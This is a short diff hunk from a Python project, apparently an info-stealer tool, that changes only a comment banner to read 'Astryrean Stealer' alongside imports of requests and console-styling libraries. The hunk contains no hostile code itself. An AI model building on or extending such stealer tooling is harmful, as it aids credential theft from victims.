@@ -9,8 +9,9 @@ from colorama import Fore
 import pyfiglet
 import requests
 
-# ============================================================================ #
-
+# ================================================================================================================================== #
+#                                                              Astryrean Stealer                                                     #
+# ================================================================================================================================== #
 from pystyle import Center
 from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
